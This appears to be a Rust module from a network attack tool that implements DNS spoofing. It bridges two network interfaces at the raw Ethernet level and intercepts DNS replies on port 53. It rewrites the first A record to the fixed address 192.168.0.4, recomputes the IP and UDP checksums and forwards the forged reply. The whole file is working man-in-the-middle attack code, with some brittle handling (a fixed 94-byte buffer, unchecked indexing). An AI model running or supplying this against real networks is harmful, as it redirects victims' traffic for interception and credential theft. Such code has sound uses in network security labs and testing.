use axum::body::Bytes;
use dns_message_parser::rr::RR;
use dns_message_parser::Dns as DnsMessage;
use erased_serde::Serialize as ErasedSerialize;
use futures::channel::mpsc::SendError;
use pnet::packet::ipv4::{self, MutableIpv4Packet};
use pnet::packet::udp::{self, MutableUdpPacket};
use pnet::packet::MutablePacket;
use pnet_datalink::Channel::Ethernet;
use pnet_datalink::{self, Config, DataLinkReceiver, DataLinkSender, NetworkInterface};
use serde::Serialize;
use std::default;
use std::net::Ipv4Addr;
use std::time::Duration;
use tokio::task::spawn_blocking;
use tracing::{debug, error, info};
use tokio::sync::{Mutex,broadcast::{self, Receiver, Sender}};
use async_trait::async_trait;
use append_only_vec::AppendOnlyVec;
use std::sync::Arc;

use super::attack::Attack;
use pnet::packet::{
    ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket},
    ip::IpNextHeaderProtocols,
    ipv4::Ipv4Packet,
    udp::UdpPacket,
    Packet,
};

pub struct Dns {
    pub interface1_name: String,
    pub interface2_name: String,
    pub stop_channel: Option<Sender<bool>>,
    pub logs: Arc<AppendOnlyVec<DnsPacket>>,
}

impl Default for Dns {
    fn default() -> Self {
        Dns { 
            interface1_name: String::new(), 
            interface2_name: String::new(),
            stop_channel: None,logs: Arc::new(AppendOnlyVec::<DnsPacket>::new())
        }
    }
}

#[derive(Serialize, Clone)]
pub struct DnsPacket {
    port: u16,
}

const INTERFACE_READ_TIMEOUT_MS: u64 = 1;

#[async_trait]
impl Attack for Dns {
    fn get_logs(&self) -> Vec<Box<dyn erased_serde::Serialize>> {
        self.logs.iter().cloned().map(|x|Box::new(x) as Box<dyn erased_serde::Serialize >).collect()
    }
    fn start(&mut self) {
        let modifier = |mut rx_channel: Box<dyn DataLinkReceiver>,
                        mut tx_channel: Box<dyn DataLinkSender>, 
                        mut stop_channel: Receiver<bool>,
                        logs: Arc<AppendOnlyVec<DnsPacket>>| {
            move || {
                info!("started DNS modification attack worker thread");

                // Find the network interface with the provided name
                loop {
                    if stop_channel.try_recv().is_ok() {
                        debug!("Stopping task");
                        break;
                    }
                    while let Ok(rx_raw) = rx_channel.next() {
                        // Attempt to decode the data as an Ethernet frame
                        let Some(rx_ethernet_frame) = EthernetPacket::new(rx_raw) else {
                            debug!("Ethernet frame parse failed");
                            tx_channel.send_to(rx_raw, None);
                            continue;
                        };

                        info!("{:?}", rx_ethernet_frame);
                        info!("Size: {}", rx_ethernet_frame.packet().len());

                        // Check that the encapsulated payload is an IP packet
                        if rx_ethernet_frame.get_ethertype() != EtherTypes::Ipv4 {
                            debug!("Ethertype is not Ipv4");
                            tx_channel.send_to(rx_raw, None);
                            continue;
                        }

                        // Attempt to decode the Ethernet frame payload as an IP packet
                        let Some(rx_ipv4_packet) =
                            Ipv4Packet::new(rx_ethernet_frame.payload()) else
                        {
                            debug!("IP packet parse failed");
                            tx_channel.send_to(rx_raw, None);
                            continue;
                        };

                        // Check that the encapsulated payload is a UDP datagram
                        if rx_ipv4_packet.get_next_level_protocol() != IpNextHeaderProtocols::Udp {
                            debug!("IP packet next level protocol not UDP");
                            tx_channel.send_to(rx_raw, None);
                            continue;
                        }

                        // Attempt to decode the IP packet payload as a UDP datagram
                        let Some(rx_udp_packet) =
                            UdpPacket::new(rx_ipv4_packet.payload())
                        else {
                            debug!("UDP datagram parse failed");
                            tx_channel.send_to(rx_raw, None);
                            continue;
                        };

                        // Check that the UDP port is DNS standart port 53
                        if rx_udp_packet.get_source() != 53 && rx_udp_packet.get_destination() != 53
                        {
                            tx_channel.send_to(rx_raw, None);
                            continue;
                        }

                        // Attempt to decode the UDP datagram payload as a DNS message
                        let Ok(mut rx_dns_packet) = DnsMessage::decode(Bytes::from(rx_udp_packet.payload().to_vec())) else{ 
                            debug!("DNS message parse failed");
                            tx_channel.send_to(rx_raw, None);
                            continue;
                        };

                        // true for reply
                        if rx_dns_packet.flags.qr {
                            info!(
                                "Modifying query for: {:?}",
                                rx_dns_packet.questions[0].domain_name
                            );
                            if let RR::A(a) = &mut rx_dns_packet.answers[0] {
                                a.ipv4_addr = Ipv4Addr::new(192, 168, 0, 4)
                            }
                            let mut buf: [u8; 94] = [0; 94];
                            if let Some(mut tx_ethernet_frame) =
                                MutableEthernetPacket::new(buf.as_mut_slice())
                            {
                                info!("rebuilding ethernet");
                                tx_ethernet_frame.clone_from(&rx_ethernet_frame);

                                if let Some(mut tx_ipv4_packet) =
                                    MutableIpv4Packet::new(tx_ethernet_frame.payload_mut())
                                {
                                    info!("rebuilding ip");
                                    let source_ip = tx_ipv4_packet.get_source();
                                    let destination_ip = tx_ipv4_packet.get_destination();
                                    tx_ipv4_packet.clone_from(&rx_ipv4_packet);
                                    tx_ipv4_packet.set_checksum(ipv4::checksum(
                                        &tx_ipv4_packet.to_immutable(),
                                    ));
                                    if let Some(mut tx_udp_packet) =
                                        MutableUdpPacket::new(tx_ipv4_packet.payload_mut())
                                    {
                                        info!("rebuilding udp");
                                        if let Ok(tx_dns_packet) = rx_dns_packet.encode() {
                                            info!("rebuilding dns");
                                            tx_udp_packet.clone_from(&rx_udp_packet);
                                            tx_udp_packet.set_payload(&tx_dns_packet);
                                            tx_udp_packet.set_checksum(udp::ipv4_checksum(
                                                &tx_udp_packet.to_immutable(),
                                                &source_ip,
                                                &destination_ip,
                                            ));
                                            /*
                                            tx_udp_packet
                                                .set_length(
                                                    tx_dns_packet
                                                        .len()
                                                        .try_into()
                                                        .unwrap(),
                                                );
                                            */
                                        }
                                    }
                                }
                                info!("adding log entry");
                                logs.push(DnsPacket{port: 0});

                                info!("{:?}", tx_ethernet_frame);
                                info!("{:02x?}", tx_ethernet_frame.packet());
                                tx_channel.send_to(tx_ethernet_frame.packet(), None);
                            }
                            continue;
                        }
                        tx_channel.send_to(rx_raw, None);
                        ()
                    }
                }
            }
        };
        info!("{}", self.interface1_name);
        info!("{}", self.interface2_name);
        let interface1 = pnet_datalink::interfaces()
            .into_iter()
            .filter(|iface: &NetworkInterface| iface.name == self.interface1_name)
            .next()
            .unwrap();
        let interface2 = pnet_datalink::interfaces()
            .into_iter()
            .filter(|iface: &NetworkInterface| iface.name == self.interface2_name)
            .next()
            .unwrap();
        let (tx_channel1, rx_channel1) = match pnet_datalink::channel(
            &interface1,
            Config {
                read_timeout: Some(Duration::from_millis(INTERFACE_READ_TIMEOUT_MS)),
                ..Default::default()
            },
        ) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!("Failed to create datalink channel: {}", e),
        };
        let (tx_channel2, rx_channel2) = match pnet_datalink::channel(
            &interface2,
            Config {
                read_timeout: Some(Duration::from_millis(INTERFACE_READ_TIMEOUT_MS)),
                ..Default::default()
            },
        ) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!("Failed to create datalink channel: {}", e),
        };
        let (tx_stop_channel, rx_stop_channel1) = broadcast::channel::<bool>(1);
        let rx_stop_channel2 = tx_stop_channel.subscribe();
        self.stop_channel = Some(tx_stop_channel);
        spawn_blocking(modifier(rx_channel1, tx_channel2, rx_stop_channel1, self.logs.clone()));
        spawn_blocking(modifier(rx_channel2, tx_channel1, rx_stop_channel2, self.logs.clone()));
        ()
    }
    fn stop(&mut self) -> Result<(), Box<dyn std::error::Error>>{
        if let Some(channel) = self.stop_channel.as_mut() {
            channel.send(true)?;
        }
        Ok(())
    }
}
